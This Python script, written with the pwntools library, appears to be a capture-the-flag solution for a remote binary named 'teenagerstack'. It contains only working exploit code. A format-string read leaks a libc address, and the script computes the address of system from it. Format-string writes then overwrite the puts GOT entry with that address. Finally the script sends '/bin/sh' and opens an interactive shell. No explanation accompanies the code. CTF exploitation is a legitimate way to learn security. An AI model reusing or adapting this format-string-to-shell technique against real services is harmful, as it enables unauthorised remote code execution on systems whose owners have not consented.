from pwn import*

context(log_level='debug',arch='amd64',os='linux')
#p=process("./teenagerstack")
p=remote("chal.thuctf.redbud.info",49525)
libc1=ELF("libc.so.6")
p.recvuntil("(less than 0x20 characters)\n")
def f(send2):
    i=send2-0x60
    if i<0:
        i+=0x100
    return i
p.sendline("aaaa%41$p")
p.recvuntil("aaaa")
puts_addr=0x404018
leak_addr=int(p.recvline(keepends=False),16)
libc_start_main_addr=leak_addr-0x80

libcbase = libc_start_main_addr - libc1.symbols["__libc_start_main"]
system_addr = libcbase + libc1.symbols['system']

print(hex(libcbase))
print(hex(system_addr))
p.recvline()
system_str=str(hex(system_addr))
#格式化字符串对应%6$p
send1=int(system_str[-4:],16)
send2=int(system_str[-6:-4],16)
send3=int(system_str[-12:-8],16)
payload=b"%"+str(send1).encode("latin-1")+b"c"+b"%11$hn"
print(send2)
print(f(send2))
payload+=b"%"+str(f(send2)).encode("latin-1")+b"c"+b"%12$hhn"

payload=payload.ljust(0x28,b'a')
payload+=p64(puts_addr)+p64(puts_addr+2)

#gdb.attach(p)
p.sendline(payload)
p.recvuntil("\x40\x40\n")
p.sendline("/bin/sh\x00")

p.interactive()